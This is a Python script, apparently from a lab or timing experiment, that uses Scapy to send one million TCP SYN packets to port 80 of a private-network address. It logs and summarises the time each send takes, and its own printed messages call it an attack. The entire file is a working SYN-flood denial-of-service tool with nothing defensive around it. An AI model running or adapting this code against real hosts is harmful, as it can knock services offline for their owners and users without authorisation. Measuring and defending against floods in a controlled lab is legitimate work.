from scapy.all import IP, TCP, sendp
import time
import statistics

target_ip = "192.168.1.55"
target_port = 80
packets_per_loop = 10000
loops = 100

times = [] 

start_total = time.time()
print("Starting attack...")

with open("syns_results_p.txt", "w") as f:
    for i in range(loops):
        for j in range(packets_per_loop):
            packet_num = i * packets_per_loop + j + 1
            syn_packet = IP(dst=target_ip) / TCP(dport=target_port, flags="S")

            start = time.time()
            sendp(syn_packet, verbose=False)
            end = time.time()

            delta_ms = (end - start) * 1000  
            times.append(delta_ms)
            f.write(f"Packet {packet_num}: {delta_ms:.2f} ms\n")

        print(f"Sent {(i + 1) * packets_per_loop} packets")

end_total = time.time()
total_time = end_total - start_total  
average_time_ms = statistics.mean(times)
std_dev_ms = statistics.stdev(times)

with open("syns_results_p.txt", "a") as f:
    f.write(f"\nTotal time: {total_time:.2f} seconds\n")
    f.write(f"Average packet send time: {average_time_ms:.2f} ms\n")
    f.write(f"Standard Deviation: {std_dev_ms:.2f} ms\n")

print("\nAttack completed successfully!")
print(f"Total time: {total_time:.2f} seconds")
print(f"Average packet send time: {average_time_ms:.2f} ms")
print(f"Standard Deviation: {std_dev_ms:.2f} ms")

